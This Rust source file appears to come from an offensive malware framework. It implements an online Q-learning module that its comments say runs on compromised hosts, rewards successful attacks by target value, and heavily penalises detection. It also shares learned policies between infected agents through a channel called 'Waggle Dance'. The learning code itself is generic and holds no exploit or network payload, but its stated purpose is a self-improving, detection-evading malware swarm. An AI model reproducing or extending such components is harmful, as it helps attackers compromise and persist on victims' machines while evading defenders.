// Online MARL: reinforcement learning during live operation.
// The colony collects rewards from real attacks (success/failure/detection)
// and updates the Drone's policy in real-time using Q-learning.
// No offline training needed — the hive improves with every infection.
//
// Lightweight enough to run on compromised hosts alongside other agents.

use std::collections::HashMap;
use tracing::info;

/// Lightweight Q-learning state tracker.
pub struct OnlineMarl {
    pub q_table: HashMap<(u64, usize), f32>,  // (state_hash, action) -> Q-value
    pub learning_rate: f32,
    pub discount_factor: f32,
    pub epsilon: f32,
    pub episodes: u64,
    pub total_reward: f32,
}

impl Default for OnlineMarl {
    fn default() -> Self {
        Self::new()
    }
}

impl OnlineMarl {
    pub fn new() -> Self {
        Self {
            q_table: HashMap::new(),
            learning_rate: 0.1,
            discount_factor: 0.95,
            epsilon: 0.2,
            episodes: 0,
            total_reward: 0.0,
        }
    }

    /// Hash a state vector into a single u64 for table lookup.
    pub fn hash_state(state: &[f32]) -> u64 {
        let mut h: u64 = 0x9e3779b97f4a7c15;
        for (i, &v) in state.iter().enumerate() {
            let bits = v.to_bits() as u64;
            h = h.wrapping_mul(31).wrapping_add(bits);
            h = h.wrapping_mul(31).wrapping_add(i as u64);
        }
        h
    }

    /// Choose action: epsilon-greedy from Q-table.
    pub fn choose_action(&self, state_hash: u64, num_actions: usize) -> usize {
        if rand::random::<f32>() < self.epsilon {
            return rand::random::<usize>() % num_actions;
        }

        let mut best_action = 0;
        let mut best_q = f32::NEG_INFINITY;
        for a in 0..num_actions {
            let q = self.q_table.get(&(state_hash, a)).copied().unwrap_or(0.0);
            if q > best_q {
                best_q = q;
                best_action = a;
            }
        }
        best_action
    }

    /// Update Q-table with observed reward.
    /// Called after an action is executed and the result is known.
    pub fn learn(&mut self, state_hash: u64, action: usize, reward: f32, next_state_hash: u64, num_actions: usize) {
        // Find max Q for next state
        let max_next_q = (0..num_actions)
            .map(|a| self.q_table.get(&(next_state_hash, a)).copied().unwrap_or(0.0))
            .fold(f32::NEG_INFINITY, f32::max);

        let current_q = self.q_table.get(&(state_hash, action)).copied().unwrap_or(0.0);
        let new_q = current_q + self.learning_rate * (reward + self.discount_factor * max_next_q - current_q);

        self.q_table.insert((state_hash, action), new_q);
        self.episodes += 1;
        self.total_reward += reward;

        // Decay epsilon
        self.epsilon = (self.epsilon * 0.999).max(0.01);

        if self.episodes.is_multiple_of(100) {
            info!("MARL_ONLINE: ep={} avg_reward={:.3} epsilon={:.3} table_size={}",
                self.episodes, self.total_reward / self.episodes as f32,
                self.epsilon, self.q_table.len());
        }
    }

    /// Record the result of an attack: success = positive reward, detection = negative.
    #[allow(clippy::too_many_arguments)]
    pub fn record_attack_result(&mut self, previous_state: &[f32], action: usize,
                                 success: bool, detected: bool, value_score: f32,
                                 next_state: &[f32], num_actions: usize) {
        let reward = if detected {
            -5.0  // Heavy penalty for detection
        } else if success {
            value_score * 10.0  // Reward proportional to target value
        } else {
            -0.5  // Small penalty for failed attempt
        };

        let prev_hash = Self::hash_state(previous_state);
        let next_hash = Self::hash_state(next_state);

        self.learn(prev_hash, action, reward, next_hash, num_actions);
    }

    /// Export learned Q-values for sharing via Waggle Dance.
    pub fn export_top_policies(&self, top_n: usize) -> Vec<(u64, usize, f32)> {
        let mut entries: Vec<_> = self.q_table.iter()
            .map(|((s, a), q)| (*s, *a, *q))
            .collect();
        entries.sort_by(|a, b| b.2.partial_cmp(&a.2).unwrap());
        entries.into_iter().take(top_n).collect()
    }

    /// Import Q-values shared by another agent via Waggle Dance.
    pub fn import_policies(&mut self, policies: &[(u64, usize, f32)]) {
        for (state_hash, action, q_value) in policies {
            let existing = self.q_table.get(&(*state_hash, *action)).copied().unwrap_or(0.0);
            // Blend: 70% existing knowledge, 30% imported
            self.q_table.insert((*state_hash, *action), existing * 0.7 + q_value * 0.3);
        }
        info!("MARL_ONLINE: imported {} policies from colony", policies.len());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_learn_improves_q() {
        let mut marl = OnlineMarl::new();
        let state = vec![0.5f32; 10];
        let sh = OnlineMarl::hash_state(&state);
        let initial_q = marl.q_table.get(&(sh, 0)).copied().unwrap_or(0.0);
        marl.learn(sh, 0, 10.0, sh, 5);
        let new_q = marl.q_table.get(&(sh, 0)).copied().unwrap();
        assert!(new_q > initial_q, "Q-value should increase with positive reward");
    }

    #[test]
    fn test_hash_deterministic() {
        let s1 = vec![1.0, 2.0, 3.0];
        let s2 = vec![1.0, 2.0, 3.0];
        assert_eq!(OnlineMarl::hash_state(&s1), OnlineMarl::hash_state(&s2));
    }

    #[test]
    fn test_export_import() {
        let mut marl = OnlineMarl::new();
        marl.q_table.insert((1, 0), 5.0);
        marl.q_table.insert((2, 1), 3.0);
        let exported = marl.export_top_policies(10);
        assert_eq!(exported.len(), 2);

        let mut marl2 = OnlineMarl::new();
        marl2.import_policies(&exported);
        assert!(!marl2.q_table.is_empty());
    }
}
